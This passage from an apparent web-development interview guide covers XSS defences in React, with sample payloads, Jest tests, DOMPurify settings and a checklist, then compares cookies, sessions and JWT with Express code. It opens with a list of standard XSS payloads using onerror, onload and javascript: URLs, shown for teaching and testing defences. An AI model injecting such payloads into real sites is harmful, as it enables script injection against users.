<!-- Image with onerror -->
<img src=x onerror=alert('XSS')>

<!-- SVG with script -->
<svg onload=alert('XSS')>

<!-- JavaScript protocol -->
<a href="javascript:alert('XSS')">Click</a>

<!-- Style injection -->
<div style="background:url('javascript:alert(1)')">

<!-- Event handler -->
<input onfocus=alert('XSS') autofocus>

<!-- Encoded script -->
&#60;script&#62;alert('XSS')&#60;/script&#62;
```

### Testing for XSS:

```tsx
import { render, screen } from "@testing-library/react";
import DOMPurify from "dompurify";

describe("XSS Protection", () => {
  it("should escape malicious script in JSX", () => {
    const malicious = "<script>alert('XSS')</script>";

    render(<div>{malicious}</div>);

    // Should render as text, not execute
    expect(screen.getByText(/<script>alert/)).toBeInTheDocument();
  });

  it("should sanitize HTML before rendering", () => {
    const malicious = "<img src=x onerror=alert('XSS')>";
    const clean = DOMPurify.sanitize(malicious);

    expect(clean).not.toContain("onerror");
  });

  it("should reject javascript: URLs", () => {
    const maliciousUrl = "javascript:alert('XSS')";

    function isValidUrl(url: string) {
      try {
        const parsed = new URL(url);
        return parsed.protocol === "http:" || parsed.protocol === "https:";
      } catch {
        return false;
      }
    }

    expect(isValidUrl(maliciousUrl)).toBe(false);
  });
});
```

### Best Practices Checklist:

- [ ] Always use JSX syntax for rendering user data
- [ ] Never use `dangerouslySetInnerHTML` without sanitization
- [ ] Sanitize HTML with DOMPurify before rendering
- [ ] Validate URLs before using in `href` or `src`
- [ ] Implement Content Security Policy headers
- [ ] Avoid direct DOM manipulation (`innerHTML`, `outerHTML`)
- [ ] Validate and sanitize input on backend
- [ ] Use TypeScript for type safety
- [ ] Test components with malicious payloads
- [ ] Keep dependencies updated (React, DOMPurify)
- [ ] Use security linters (eslint-plugin-security)
- [ ] Implement rate limiting on forms
- [ ] Educate team about XSS risks

### DOMPurify Configuration:

```tsx
import DOMPurify from "isomorphic-dompurify";

// Strict configuration (recommended)
const strictConfig = {
  ALLOWED_TAGS: ["p", "b", "i", "em", "strong"],
  ALLOWED_ATTR: [],
  KEEP_CONTENT: true
};

// Medium configuration (for rich text)
const mediumConfig = {
  ALLOWED_TAGS: ["p", "b", "i", "em", "strong", "a", "ul", "ol", "li", "h1", "h2", "h3"],
  ALLOWED_ATTR: ["href", "target"],
  ALLOWED_URI_REGEXP: /^https?:\/\//,
  ALLOW_DATA_ATTR: false
};

// Usage
const clean = DOMPurify.sanitize(userInput, strictConfig);
```

### Analogy:

Think of XSS like **injecting poison into food**:
- **User Input** = Ingredients from unknown sources
- **Sanitization** = Inspecting and cleaning ingredients
- **React's JSX** = Cooking process that neutralizes toxins
- **dangerouslySetInnerHTML** = Serving raw ingredients (dangerous!)
- **CSP** = Health inspector ensuring kitchen follows safety rules

### ⚡ One-liner to remember:
> XSS = Malicious script injection. Prevent with React's JSX, sanitize HTML with DOMPurify, validate URLs, and set CSP headers.

---

## Q10. What is the difference between Cookies, Sessions, and JWT tokens?

### Concept:

**Cookies**, **Sessions**, and **JWT tokens** are different mechanisms for maintaining user state and authentication in web applications.

### 1. Cookies

**What they are:** Small pieces of data (max 4KB) stored in the browser and sent with every HTTP request to the same domain.

**How they work:**
```
1. Server sends: Set-Cookie: sessionId=abc123
2. Browser stores cookie
3. Browser sends cookie with every request to that domain
4. Server reads cookie to identify user
```

**Implementation:**
```typescript
// Server sets cookie
res.cookie("userId", "123", {
  httpOnly: true,      // Not accessible via JavaScript (XSS protection)
  secure: true,        // Only sent over HTTPS
  sameSite: "strict",  // CSRF protection
  maxAge: 3600000      // 1 hour
});

// Server reads cookie
const userId = req.cookies.userId;

// Client (browser automatically sends cookies)
fetch("/api/profile"); // Cookie sent automatically
```

**Types of Cookies:**

| Type | Stored Where | Lifespan | Security |
|------|-------------|----------|----------|
| **Session Cookie** | Browser memory | Until browser closes | Less persistent |
| **Persistent Cookie** | Browser disk | Until expiration date | More persistent |
| **httpOnly Cookie** | Browser (no JS access) | Until expiration | More secure |
| **Secure Cookie** | Sent only over HTTPS | Until expiration | More secure |

**Pros:**
- Automatic (browser handles sending)
- Works without JavaScript
- Can be httpOnly (XSS protection)

**Cons:**
- Limited size (4KB)
- Sent with every request (overhead)
- CSRF vulnerability (if not protected)
- Domain-specific

---

### 2. Sessions

**What they are:** Server-side storage that stores user data. A session ID is stored in a cookie on the client.

**How they work:**
```
1. User logs in
2. Server creates session in memory/database
3. Server sends session ID to client (via cookie)
4. Client sends session ID with each request
5. Server looks up session data using ID
```

**Implementation:**
```typescript
import session from "express-session";
import RedisStore from "connect-redis";
import Redis from "ioredis";

const redis = new Redis();

app.use(session({
  store: new RedisStore({ client: redis }),
  secret: process.env.SESSION_SECRET,
  resave: false,
  saveUninitialized: false,
  cookie: {
    httpOnly: true,
    secure: process.env.NODE_ENV === "production",
    maxAge: 1000 * 60 * 60 * 24 // 24 hours
  }
}));

// Login - create session
app.post("/login", async (req, res) => {
  const user = await authenticateUser(req.body);

  if (user) {
    req.session.userId = user.id;
    req.session.role = user.role;
    res.json({ message: "Logged in" });
  } else {
    res.status(401).json({ error: "Invalid credentials" });
  }
});

// Protected route - check session
app.get("/profile", (req, res) => {
  if (!req.session.userId) {
    return res.status(401).json({ error: "Not authenticated" });
  }

  res.json({ userId: req.session.userId });
});

// Logout - destroy session
app.post("/logout", (req, res) => {
  req.session.destroy();
  res.json({ message: "Logged out" });
});
```

**Session Storage Options:**

| Storage | Pros | Cons |
|---------|------|------|
| **Memory** | Fast, simple | Lost on restart, not scalable |
| **Database** | Persistent, scalable | Slower, DB overhead |
| **Redis** | Fast, scalable, persistent | Extra dependency |

**Pros:**
- Server controls all data
- Can store large amounts of data
- Easy to invalidate (logout)
- Secure (data not in client)

**Cons:**
- Server state (scalability challenge)
- Requires storage (memory/Redis/DB)
- Session hijacking risk
- Not ideal for microservices

---

### 3. JWT (JSON Web Token)

**What they are:** Self-contained, stateless tokens that contain encoded user information and a signature.

**How they work:**
```
1. User logs in
2. Server creates JWT with user data
3. Client stores JWT (localStorage or cookie)
4. Client sends JWT with each request (Authorization header)
5. Server verifies JWT signature (no database lookup needed)
```

**Structure:**
```
header.payload.signature
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjEyM30.SflKxwRJSMeKKF2QT
```

**Implementation:**
```typescript
import jwt from "jsonwebtoken";

// Login - create JWT
app.post("/login", async (req, res) => {
  const user = await authenticateUser(req.body);

  if (user) {
    const token = jwt.sign(
      { userId: user.id, role: user.role },
      process.env.JWT_SECRET,
      { expiresIn: "1h" }
    );

    res.json({ token });
  } else {
    res.status(401).json({ error: "Invalid credentials" });
  }
});

// Protected route - verify JWT
app.get("/profile", (req, res) => {
  const token = req.headers.authorization?.split(" ")[1];

  if (!token) {
    return res.status(401).json({ error: "No token" });
  }

  try {
    const decoded = jwt.verify(token, process.env.JWT_SECRET);
    res.json({ userId: decoded.userId });
  } catch {
    res.status(401).json({ error: "Invalid token" });
  }
});

// Client side
// Store JWT
localStorage.setItem("token", token);

// Send JWT with requests
fetch("/api/profile", {
  headers: {
    Authorization: `Bearer ${token}`
  }
});
```

**Pros:**
- Stateless (no server storage)
- Scalable (works across servers)
- Good for microservices
- Self-contained (includes user data)

**Cons:**
- Can't invalidate before expiration
- Larger than session ID (sent with every request)
- Vulnerable if stored in localStorage (XSS)
- Token size overhead

---

### Comprehensive Comparison:

| Aspect | Cookies | Sessions | JWT |
|--------|---------|----------|-----|
| **Storage** | Client browser | Server (+ session ID in cookie) | Client (localStorage or cookie) |
| **State** | Stateless | Stateful | Stateless |
| **Size** | 4KB max | Unlimited (server-side) | ~1-2KB (grows with data) |
| **Scalability** | Good | Challenging (needs shared storage) | Excellent |
| **Security** | CSRF risk, XSS if not httpOnly | Server-controlled, secure | XSS risk if in localStorage |
| **Invalidation** | Can delete cookie | Easy (destroy session) | Hard (can't revoke before expiry) |
| **Server load** | Low | Medium (session lookups) | Low (no lookups) |
| **Mobile apps** | Limited support | Limited support | Excellent |
| **Microservices** | Works | Needs shared session store | Excellent |
| **Use case** | Simple sites, preferences | Traditional web apps | APIs, SPAs, microservices |

---

### Real-World Usage Examples:

#### Scenario 1: E-commerce Website (Traditional)

```typescript
// Use Sessions
app.use(session({ /* config */ }));

app.post("/login", (req, res) => {
  req.session.userId = user.id;
  req.session.cart = [];
});

app.post("/cart/add", (req, res) => {
  req.session.cart.push(req.body.item);
});
```

**Why?** Server needs to store shopping cart, easy logout, traditional web app.

---

#### Scenario 2: Mobile App + API

```typescript
// Use JWT
app.post("/login", (req, res) => {
  const token = jwt.sign({ userId: user.id }, SECRET);
  res.json({ token });
});

// Mobile app stores token and sends with requests
```

**Why?** Stateless, works across multiple API servers, mobile-friendly.

---

#### Scenario 3: Hybrid Approach (Best of Both)

```typescript
// Store JWT in httpOnly cookie (combines benefits)
app.post("/login", (req, res) => {
  const token = jwt.sign({ userId: user.id }, SECRET);

  res.cookie("token", token, {
    httpOnly: true,    // XSS protection
    secure: true,      // HTTPS only
    sameSite: "strict" // CSRF protection
  });

  res.json({ message: "Logged in" });
});

// Middleware reads JWT from cookie
app.use((req, res, next) => {
  const token = req.cookies.token;
  if (token) {
    req.user = jwt.verify(token, SECRET);
  }
  next();
});
```

**Why?** JWT benefits + Cookie security (httpOnly).

---

### Common Patterns:

**Pattern 1: Session with Redis (Scalable)**
```typescript
// Multiple servers share Redis session store
const store = new RedisStore({ client: redis });
app.use(session({ store }));
```

**Pattern 2: JWT with Refresh Token**
```typescript
// Short-lived access token + long-lived refresh token
const accessToken = jwt.sign(payload, SECRET, { expiresIn: "15m" });
const refreshToken = jwt.sign(payload, REFRESH_SECRET, { expiresIn: "7d" });

// Store refresh token in database for revocation
await db.refreshTokens.create({ userId, token: refreshToken });
```

**Pattern 3: Cookie + Session + JWT**
```typescript
// Cookie holds session ID
// Session stores JWT
req.session.jwt = jwt.sign(payload, SECRET);
```

---

### Security Comparison:

| Attack | Cookies | Sessions | JWT |
|--------|---------|----------|-----|
| **XSS** | Protected if httpOnly | Protected (server-side) | Vulnerable if in localStorage |
| **CSRF** | Vulnerable (needs sameSite) | Vulnerable (needs CSRF token) | Not vulnerable (manual sending) |
| **Token theft** | Cookie hijacking | Session hijacking | Token stealing |
| **Mitigation** | httpOnly + sameSite + secure | Secure session ID + regeneration | httpOnly cookie or short expiry |

---

### When to Use Each:

**Use Cookies when:**
- Storing small data (user preferences, theme)
- Need automatic sending
- Simple authentication
- Same-domain only

**Use Sessions when:**
- Traditional server-rendered apps
- Need to store lots of user data
- Easy logout is important
- Single server or shared session store available

**Use JWT when:**
- Building APIs
- Microservices architecture
- Mobile apps
- Need stateless authentication
- Cross-domain authentication
- High scalability requirements

---

### Migration Path:

```
Simple App → Cookies → Sessions → JWT

Small site with preferences
    ↓
Add user accounts → Use Sessions
    ↓
Build mobile app → Add JWT API
    ↓
Microservices → Full JWT
```

---

### Analogy:

**Cookies** = Name tag at a conference (everyone can see it, limited info)

**Sessions** = Coat check ticket (ticket is small, coat with all your stuff is stored safely)

**JWT** = VIP pass with QR code (all your access info encoded in the pass itself)

---

### ⚡ One-liner to remember:
> Cookies = Browser storage sent automatically. Sessions = Server storage with cookie ID. JWT = Self-contained stateless token.

---




